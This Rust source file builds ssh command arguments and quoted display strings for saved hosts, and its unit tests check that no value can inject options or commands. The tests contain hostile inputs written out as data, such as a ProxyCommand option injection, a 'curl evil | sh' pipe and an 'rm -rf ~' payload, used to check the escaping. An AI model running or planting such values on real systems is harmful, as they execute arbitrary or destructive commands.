//! The ssh command for a saved host, in two forms that are never mixed up.
//!
//! - [`SshArgs`] is what gets *spawned*: an argument vector, one element per
//!   argument, with no quoting at all. It goes to [`std::process::Command`]
//!   directly, never through a shell, and the destination always comes after
//!   `--`, so nothing in it can be read as an option.
//! - [`DisplayCommand`] is what a *person* reads and pastes: one line, with
//!   every argument quoted for their shell. It is text for a screen or a
//!   clipboard and is never spawned.
//!
//! They are different types on purpose. A `DisplayCommand` has no way to become
//! arguments, and `SshArgs` never contains quote characters that were not in
//! the value itself.
//!
//! Every value comes from a validated [`Host`], and is checked again here, at
//! run time in release builds too: this is the point where a value would
//! become part of a command line.

use std::fmt;

use super::export::{endpoint, jump_spec};
use crate::domain::jump::{ChainError, jump_chain};
use crate::domain::validate::validate_host_fields;
use crate::domain::{Host, Hosts, ValidationError};
use crate::sanitize::is_unsafe_char;
use crate::text::escape_control;

/// Which shell's quoting rules the display string follows.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Shell {
    /// `sh`, bash, zsh, fish: single quotes.
    Posix,
    /// PowerShell and cmd.exe: double quotes, and only for values that both can
    /// quote without expanding anything inside.
    Windows,
}

impl Shell {
    /// The shell family of the platform Bifrost is running on.
    pub fn current() -> Self {
        if cfg!(windows) {
            Shell::Windows
        } else {
            Shell::Posix
        }
    }
}

/// Why no command could be built.
#[derive(Debug, PartialEq, Eq)]
pub enum CommandError {
    /// A field is not valid (the same rules as when a host is saved).
    Invalid(ValidationError),
    /// The jump host chain cannot be followed.
    Chain(ChainError),
    /// A value holds a control character, is empty where it must not be, or
    /// would be read by ssh as an option.
    UnsafeValue { field: &'static str },
    /// A value cannot be written safely for the display shell.
    CannotQuote { value: String },
}

impl fmt::Display for CommandError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            CommandError::Invalid(err) => write!(f, "The host is not valid: {err}"),
            CommandError::Chain(err) => write!(f, "The jump hosts cannot be followed: {err}"),
            CommandError::UnsafeValue { field } => write!(
                f,
                "The {field} holds a character that must never reach ssh, so no command was built."
            ),
            CommandError::CannotQuote { value } => write!(
                f,
                "'{}' cannot be written safely for a Windows command line, so the command is not shown.",
                escape_control(value)
            ),
        }
    }
}

impl std::error::Error for CommandError {}

/// The arguments to start ssh with, one element per argument, unquoted.
///
/// The program is not included: it is `ssh`, resolved separately.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshArgs(Vec<String>);

impl SshArgs {
    pub fn as_slice(&self) -> &[String] {
        &self.0
    }
}

/// The command as text for a person: quoted, on one line, starting with `ssh`.
///
/// This is for showing and copying. It is deliberately not convertible to
/// arguments.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DisplayCommand(String);

impl DisplayCommand {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl fmt::Display for DisplayCommand {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

/// A value that is about to become an argument: never empty, no control
/// characters, and not starting with `-` unless `may_start_with_dash`.
fn checked(
    field: &'static str,
    value: &str,
    may_start_with_dash: bool,
) -> Result<String, CommandError> {
    let bad = value.is_empty()
        || value.chars().any(is_unsafe_char)
        || (!may_start_with_dash && value.starts_with('-'));
    if bad {
        return Err(CommandError::UnsafeValue { field });
    }
    Ok(value.to_string())
}

/// The arguments that connect to `host`, using `hosts` to resolve its jump
/// hosts.
///
/// Options come first, then `--`, then the destination: whatever the hostname
/// holds, it cannot be taken for an option. When an identity file is set,
/// `IdentitiesOnly=yes` is passed with it, so ssh offers only that key.
pub fn build_args(host: &Host, hosts: &Hosts) -> Result<SshArgs, CommandError> {
    validate_host_fields(host).map_err(CommandError::Invalid)?;
    let chain = jump_chain(hosts.as_slice(), host).map_err(CommandError::Chain)?;
    for hop in &chain {
        validate_host_fields(hop).map_err(CommandError::Invalid)?;
    }

    let mut args: Vec<String> = Vec::new();
    let mut flag = |name: &str, value: String| {
        args.push(name.to_string());
        args.push(value);
    };

    if let Some(user) = &host.user {
        flag("-l", checked("user", user, false)?);
    }
    if let Some(port) = host.port {
        flag("-p", port.to_string());
    }
    if let Some(identity_file) = &host.identity_file {
        flag("-i", checked("identity file", identity_file, false)?);
        flag("-o", "IdentitiesOnly=yes".to_string());
    }
    if !chain.is_empty() {
        let hops: Vec<String> = chain.iter().map(|hop| jump_spec(hop)).collect();
        flag("-J", checked("jump host", &hops.join(","), false)?);
    }
    if host.forward_agent {
        args.push("-A".to_string());
    }
    for (option, field, forwards) in [
        ("-L", "local forward", &host.local_forwards),
        ("-R", "remote forward", &host.remote_forwards),
    ] {
        for forward in forwards {
            let spec = format!(
                "{}:{}",
                endpoint("127.0.0.1", forward.listen_port),
                endpoint(&forward.dest_host, forward.dest_port)
            );
            args.push(option.to_string());
            args.push(checked(field, &spec, false)?);
        }
    }

    args.push("--".to_string());
    args.push(checked("hostname", &host.hostname, false)?);
    Ok(SshArgs(args))
}

/// Characters that need no quoting in a POSIX shell.
fn posix_bare(c: char) -> bool {
    c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c)
}

/// Characters that need no quoting on a Windows command line. A comma is not
/// among them (PowerShell reads it as an array), nor is `~` or a bracket.
fn windows_bare(c: char) -> bool {
    c.is_ascii_alphanumeric() || "_+=:./\\-".contains(c)
}

/// Characters that cannot be quoted safely for Windows: they are still
/// interpreted inside double quotes by cmd.exe (`%`, `!`) or by PowerShell
/// (`$`, the backtick), or they end the quote (`"`).
fn windows_unquotable(c: char) -> bool {
    matches!(c, '"' | '%' | '!' | '$' | '`')
}

fn quote_posix(arg: &str) -> String {
    if !arg.is_empty() && arg.chars().all(posix_bare) {
        return arg.to_string();
    }
    // Inside single quotes everything is literal, except the quote itself:
    // close, add an escaped quote, reopen.
    format!("'{}'", arg.replace('\'', "'\\''"))
}

fn quote_windows(arg: &str) -> Result<String, CommandError> {
    if arg.chars().any(windows_unquotable) {
        return Err(CommandError::CannotQuote {
            value: arg.to_string(),
        });
    }
    // `@` starts a splat in PowerShell, so it is only bare inside a word.
    let bare = !arg.is_empty()
        && !arg.starts_with('@')
        && arg.chars().all(|c| windows_bare(c) || c == '@');
    if bare {
        return Ok(arg.to_string());
    }
    // Backslashes just before the closing quote would escape it: double them.
    let trailing = arg.chars().rev().take_while(|&c| c == '\\').count();
    Ok(format!("\"{arg}{}\"", "\\".repeat(trailing)))
}

/// The command as one line for a person to read or paste, with every argument
/// quoted for `shell`.
pub fn display_command(args: &SshArgs, shell: Shell) -> Result<DisplayCommand, CommandError> {
    let mut parts = vec!["ssh".to_string()];
    for arg in args.as_slice() {
        if arg.chars().any(is_unsafe_char) {
            return Err(CommandError::UnsafeValue { field: "argument" });
        }
        parts.push(match shell {
            Shell::Posix => quote_posix(arg),
            Shell::Windows => quote_windows(arg)?,
        });
    }
    Ok(DisplayCommand(parts.join(" ")))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domain::Forward;

    fn host(name: &str) -> Host {
        Host::new(name, format!("{name}.example.com"))
    }

    fn hosts(list: Vec<Host>) -> Hosts {
        Hosts::from_vec(list).unwrap()
    }

    fn args_of(host: &Host, hosts: &Hosts) -> Vec<String> {
        build_args(host, hosts).unwrap().as_slice().to_vec()
    }

    fn strs(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| (*s).to_string()).collect()
    }

    // ---- test-only readers: what a shell would make of the display string --

    /// Splits a line the way a POSIX shell does, for the quoting this module
    /// produces: bare words and single-quoted runs, joined without spaces.
    fn posix_split(line: &str) -> Vec<String> {
        let mut words = Vec::new();
        let mut word = String::new();
        let mut started = false;
        let mut in_quote = false;
        let mut chars = line.chars().peekable();
        while let Some(c) = chars.next() {
            match (in_quote, c) {
                (true, '\'') => in_quote = false,
                (true, c) => word.push(c),
                (false, '\'') => {
                    in_quote = true;
                    started = true;
                }
                (false, '\\') => {
                    word.push(
                        chars
                            .next()
                            .expect("a backslash needs a character after it"),
                    );
                    started = true;
                }
                (false, ' ') => {
                    if started {
                        words.push(std::mem::take(&mut word));
                        started = false;
                    }
                }
                (false, c) => {
                    word.push(c);
                    started = true;
                }
            }
        }
        assert!(!in_quote, "unterminated quote in {line:?}");
        if started {
            words.push(word);
        }
        words
    }

    /// Splits a line the way `CommandLineToArgvW` does for the quoting this
    /// module produces.
    fn windows_split(line: &str) -> Vec<String> {
        let chars: Vec<char> = line.chars().collect();
        let mut words = Vec::new();
        let mut word = String::new();
        let mut started = false;
        let mut in_quote = false;
        let mut i = 0;
        while i < chars.len() {
            match chars[i] {
                '\\' => {
                    let run = chars[i..].iter().take_while(|&&c| c == '\\').count();
                    if chars.get(i + run) == Some(&'"') {
                        word.push_str(&"\\".repeat(run / 2));
                        if run % 2 == 1 {
                            word.push('"');
                            i += run + 1;
                            started = true;
                            continue;
                        }
                    } else {
                        word.push_str(&"\\".repeat(run));
                    }
                    started = true;
                    i += run;
                    continue;
                }
                '"' => {
                    in_quote = !in_quote;
                    started = true;
                }
                ' ' if !in_quote => {
                    if started {
                        words.push(std::mem::take(&mut word));
                        started = false;
                    }
                }
                c => {
                    word.push(c);
                    started = true;
                }
            }
            i += 1;
        }
        if started {
            words.push(word);
        }
        words
    }

    // ---- the argument vector -----------------------------------------------

    #[test]
    fn a_plain_host_is_just_the_destination_after_two_dashes() {
        let h = host("web");
        assert_eq!(
            args_of(&h, &hosts(vec![h.clone()])),
            strs(&["--", "web.example.com"])
        );
    }

    #[test]
    fn every_setting_becomes_its_option() {
        let mut jump = host("bastion");
        jump.user = Some("ops".to_string());
        jump.port = Some(2200);
        let mut h = host("web");
        h.user = Some("deploy".to_string());
        h.port = Some(2222);
        h.identity_file = Some("~/.ssh/id_ed25519".to_string());
        h.proxy_jump = Some("bastion".to_string());
        h.forward_agent = true;
        h.local_forwards = vec![Forward {
            listen_port: 8080,
            dest_host: "localhost".to_string(),
            dest_port: 80,
        }];
        h.remote_forwards = vec![Forward {
            listen_port: 9000,
            dest_host: "::1".to_string(),
            dest_port: 3000,
        }];
        let all = hosts(vec![jump, h.clone()]);

        assert_eq!(
            args_of(&h, &all),
            strs(&[
                "-l",
                "deploy",
                "-p",
                "2222",
                "-i",
                "~/.ssh/id_ed25519",
                "-o",
                "IdentitiesOnly=yes",
                "-J",
                "ops@bastion.example.com:2200",
                "-A",
                "-L",
                "127.0.0.1:8080:localhost:80",
                "-R",
                "127.0.0.1:9000:[::1]:3000",
                "--",
                "web.example.com",
            ])
        );
    }

    #[test]
    fn a_chain_of_jump_hosts_is_outermost_first_with_ports_spelled_out() {
        let outer = host("outer");
        let mut inner = host("inner");
        inner.proxy_jump = Some("outer".to_string());
        inner.user = Some("u".to_string());
        let mut h = host("web");
        h.proxy_jump = Some("inner".to_string());
        let all = hosts(vec![outer, inner, h.clone()]);
        let args = args_of(&h, &all);
        let at = args.iter().position(|a| a == "-J").unwrap();
        assert_eq!(args[at + 1], "outer.example.com:22,u@inner.example.com:22");
    }

    #[test]
    fn identities_only_is_passed_with_an_identity_file_and_only_then() {
        let mut h = host("web");
        assert!(!args_of(&h, &hosts(vec![h.clone()])).contains(&"IdentitiesOnly=yes".to_string()));
        h.identity_file = Some("/keys/id".to_string());
        let args = args_of(&h, &hosts(vec![h.clone()]));
        let at = args.iter().position(|a| a == "-i").unwrap();
        assert_eq!(
            &args[at..at + 4],
            ["-i", "/keys/id", "-o", "IdentitiesOnly=yes"]
        );
    }

    #[test]
    fn the_destination_is_always_last_and_always_after_two_dashes() {
        let mut h = host("web");
        h.user = Some("u".to_string());
        h.port = Some(22);
        h.forward_agent = true;
        let args = args_of(&h, &hosts(vec![h.clone()]));
        let n = args.len();
        assert_eq!(args[n - 2], "--");
        assert_eq!(args[n - 1], "web.example.com");
        assert_eq!(args.iter().filter(|a| *a == "--").count(), 1);
    }

    #[test]
    fn a_hostname_that_looks_like_an_option_is_refused() {
        // A `Host` is a plain struct, so validation can be bypassed by building
        // one by hand: the check must not depend on it having run.
        for bad in ["-oProxyCommand=evil", "-J evil", "--help", "-"] {
            let mut h = host("web");
            h.hostname = bad.to_string();
            let err = build_args(&h, &Hosts::new()).unwrap_err();
            assert!(
                matches!(
                    err,
                    CommandError::Invalid(_) | CommandError::UnsafeValue { .. }
                ),
                "{bad}: {err:?}"
            );
        }
    }

    #[test]
    fn values_that_could_start_an_option_are_refused_even_if_validation_is_bypassed() {
        // `checked` is the last line of defense; test it directly.
        for field in ["user", "identity file", "jump host", "hostname"] {
            assert_eq!(
                checked(field, "-oProxyCommand=evil", false),
                Err(CommandError::UnsafeValue { field })
            );
        }
        assert!(checked("x", "-", false).is_err());
        assert!(checked("x", "a-b", false).is_ok());
    }

    #[test]
    fn control_characters_are_refused_in_every_value() {
        for bad in ["a\nb", "a\rb", "a\x1bb", "a\0b", "a\u{202e}b", "a\u{85}b"] {
            assert!(checked("x", bad, false).is_err(), "{bad:?}");
            let mut h = host("web");
            h.identity_file = Some(bad.to_string());
            assert!(build_args(&h, &Hosts::new()).is_err(), "{bad:?}");
        }
        assert!(
            checked("x", "", false).is_err(),
            "empty values are refused too"
        );
    }

    #[test]
    fn an_unresolvable_jump_host_is_an_error_not_a_command_without_it() {
        let mut h = host("web");
        h.proxy_jump = Some("missing".to_string());
        let err = build_args(&h, &Hosts::new()).unwrap_err();
        assert!(matches!(err, CommandError::Chain(_)), "{err:?}");
        assert!(
            err.to_string()
                .contains("jump host 'missing' does not exist")
        );
    }

    #[test]
    fn a_host_that_fails_validation_gets_no_command() {
        let mut h = host("web");
        h.name = "bad name".to_string();
        let err = build_args(&h, &Hosts::new()).unwrap_err();
        assert!(matches!(err, CommandError::Invalid(_)));
        assert!(err.to_string().starts_with("The host is not valid:"));
    }

    // ---- the display string ------------------------------------------------

    fn display(args: &[&str], shell: Shell) -> Result<String, CommandError> {
        display_command(&SshArgs(strs(args)), shell).map(|c| c.to_string())
    }

    #[test]
    fn plain_arguments_are_shown_as_they_are() {
        assert_eq!(
            display(
                &["-l", "deploy", "-p", "22", "--", "web.example.com"],
                Shell::Posix
            )
            .unwrap(),
            "ssh -l deploy -p 22 -- web.example.com"
        );
    }

    #[test]
    fn posix_quotes_anything_a_shell_could_read_specially() {
        for (arg, shown) in [
            ("a b", "'a b'"),
            ("~/.ssh/id", "'~/.ssh/id'"),
            ("$HOME", "'$HOME'"),
            ("a;b", "'a;b'"),
            ("a&b", "'a&b'"),
            ("a|b", "'a|b'"),
            ("*.pem", "'*.pem'"),
            ("[::1]:22", "'[::1]:22'"),
            ("it's", "'it'\\''s'"),
            ("", "''"),
        ] {
            assert_eq!(quote_posix(arg), shown, "{arg:?}");
        }
    }

    #[test]
    fn windows_quotes_with_double_quotes_and_doubles_trailing_backslashes() {
        assert_eq!(quote_windows("web.example.com").unwrap(), "web.example.com");
        assert_eq!(
            quote_windows("C:\\Users\\me\\id").unwrap(),
            "C:\\Users\\me\\id"
        );
        assert_eq!(
            quote_windows("C:\\my keys\\id").unwrap(),
            "\"C:\\my keys\\id\""
        );
        assert_eq!(
            quote_windows("C:\\dir with space\\").unwrap(),
            "\"C:\\dir with space\\\\\""
        );
        assert_eq!(
            quote_windows("a,b").unwrap(),
            "\"a,b\"",
            "a comma is an array in PowerShell"
        );
        assert_eq!(quote_windows("[::1]:22").unwrap(), "\"[::1]:22\"");
        assert_eq!(
            quote_windows("@x").unwrap(),
            "\"@x\"",
            "a leading @ is a splat"
        );
        assert_eq!(quote_windows("user@host").unwrap(), "user@host");
    }

    #[test]
    fn windows_refuses_what_it_cannot_quote_safely() {
        for arg in ["a\"b", "100%", "%PATH%", "$(calc)", "a$b", "a`b", "a!b"] {
            assert!(
                matches!(quote_windows(arg), Err(CommandError::CannotQuote { .. })),
                "{arg:?}"
            );
        }
        let err = display(&["--", "a%b"], Shell::Windows).unwrap_err();
        assert!(
            err.to_string()
                .contains("cannot be written safely for a Windows command line")
        );
    }

    #[test]
    fn the_display_string_reads_back_as_exactly_the_arguments_on_posix() {
        for hostile in [
            "plain",
            "with space",
            "it's a trap",
            "$(touch /tmp/pwned)",
            "`id`",
            "a;b&&c||d",
            "a|b>c<d",
            "*?[x]{a,b}",
            "~/.ssh/id",
            "back\\slash",
            "\"double\"",
            "' ; rm -rf ~ ; '",
            "trailing'",
            "'leading",
            "#comment",
            "!bang",
        ] {
            let args = SshArgs(strs(&["-i", hostile, "--", "h.example.com"]));
            let shown = display_command(&args, Shell::Posix).unwrap();
            let mut expected = vec!["ssh".to_string()];
            expected.extend(args.as_slice().iter().cloned());
            assert_eq!(
                posix_split(shown.as_str()),
                expected,
                "{hostile:?} shown as {shown}"
            );
        }
    }

    #[test]
    fn the_display_string_reads_back_as_exactly_the_arguments_on_windows() {
        for value in [
            "plain",
            "C:\\Users\\me\\.ssh\\id",
            "C:\\my keys\\id",
            "C:\\dir with space\\",
            "a,b",
            "a&b",
            "a|b",
            "(x)",
            "a^b",
            "it's",
            "[::1]:22",
            "@x",
            "two  spaces",
        ] {
            let args = SshArgs(strs(&["-i", value, "--", "h.example.com"]));
            let shown = display_command(&args, Shell::Windows).unwrap();
            let mut expected = vec!["ssh".to_string()];
            expected.extend(args.as_slice().iter().cloned());
            assert_eq!(
                windows_split(shown.as_str()),
                expected,
                "{value:?} shown as {shown}"
            );
        }
    }

    #[test]
    fn a_control_character_never_reaches_the_display_string() {
        for shell in [Shell::Posix, Shell::Windows] {
            for bad in ["a\nb", "a\x1b[31mb", "a\u{202e}b"] {
                assert_eq!(
                    display(&["-i", bad], shell),
                    Err(CommandError::UnsafeValue { field: "argument" }),
                    "{bad:?}"
                );
            }
        }
    }

    // ---- the two forms are never mixed up ----------------------------------

    /// A host whose values are as hostile as validation allows.
    fn hostile_host() -> Host {
        let mut h = host("web");
        h.identity_file = Some("/keys/my key/it's $(id) `id` ; rm -rf ~ & echo \"x\"".to_string());
        h.user = Some("dom\\user".to_string());
        h
    }

    #[test]
    fn the_argument_vector_holds_raw_values_and_the_display_string_holds_quoted_ones() {
        let h = hostile_host();
        let all = hosts(vec![h.clone()]);
        let args = build_args(&h, &all).unwrap();
        let shown = display_command(&args, Shell::Posix).unwrap();
        let raw = h.identity_file.clone().unwrap();

        // Arguments: the value is one element, byte for byte, with no quoting.
        assert!(args.as_slice().contains(&raw));
        assert!(args.as_slice().iter().all(|a| !a.starts_with('\'')));

        // Display: the raw value is not written as-is; it is quoted.
        assert!(!shown.as_str().contains(&raw), "{shown}");
        assert!(shown.as_str().contains('\''));
        assert!(shown.as_str().starts_with("ssh "));
    }

    #[test]
    fn a_value_needing_no_quoting_looks_the_same_in_both_forms() {
        let h = host("web");
        let args = build_args(&h, &hosts(vec![h.clone()])).unwrap();
        let shown = display_command(&args, Shell::Posix).unwrap();
        assert_eq!(shown.as_str(), format!("ssh {}", args.as_slice().join(" ")));
    }

    #[test]
    fn quoting_the_display_string_twice_would_not_survive_being_spawned() {
        // If the display string were used as arguments, the quotes would become
        // part of the values. The types make that impossible to do by accident;
        // this shows why it must never be done on purpose.
        let h = hostile_host();
        let args = build_args(&h, &hosts(vec![h.clone()])).unwrap();
        let shown = display_command(&args, Shell::Posix).unwrap();
        let wrongly: Vec<&str> = shown.as_str().split(' ').collect();
        assert_ne!(
            wrongly.len(),
            args.as_slice().len() + 1,
            "splitting the display string on spaces does not give the arguments"
        );
    }

    #[test]
    fn no_value_can_inject_a_second_command_or_option_into_the_arguments() {
        let sample = [
            "/a; touch pwned",
            "/a && curl evil | sh",
            "/a\\\" -oProxyCommand=evil",
            "/a $(id)",
            "/a `id`",
            "/a' -oProxyCommand='evil",
        ];
        for value in sample {
            let mut h = host("web");
            h.identity_file = Some(value.to_string());
            let all = hosts(vec![h.clone()]);
            let args = build_args(&h, &all).unwrap();
            let slice = args.as_slice();

            // Exactly the arguments we put there: the value stays one element.
            assert_eq!(slice.len(), 6, "{value:?}: {slice:?}");
            assert_eq!(slice[1], value);
            // Nothing after `--` but the hostname; nothing before it starts an
            // option the user did not ask for.
            let dashes = slice.iter().position(|a| a == "--").unwrap();
            assert_eq!(&slice[dashes + 1..], ["web.example.com"]);
            let options: Vec<&str> = slice[..dashes]
                .iter()
                .map(String::as_str)
                .filter(|a| a.starts_with('-'))
                .collect();
            assert_eq!(options, ["-i", "-o"], "{value:?}");

            // And the display string, read the way a shell reads it, gives the
            // same arguments back: no injection there either.
            let shown = display_command(&args, Shell::Posix).unwrap();
            let mut expected = vec!["ssh".to_string()];
            expected.extend(slice.iter().cloned());
            assert_eq!(posix_split(shown.as_str()), expected, "{value:?}");
        }
    }

    #[test]
    fn a_hostile_user_cannot_add_options() {
        for bad in ["-oProxyCommand=x", "a b", "a;b", "a$b", "a'b"] {
            let mut h = host("web");
            h.user = Some(bad.to_string());
            assert!(build_args(&h, &Hosts::new()).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn errors_never_print_raw_control_characters() {
        let err = CommandError::CannotQuote {
            value: "a\x1b[31m%".to_string(),
        };
        assert!(!err.to_string().contains('\x1b'), "{err}");
    }
}
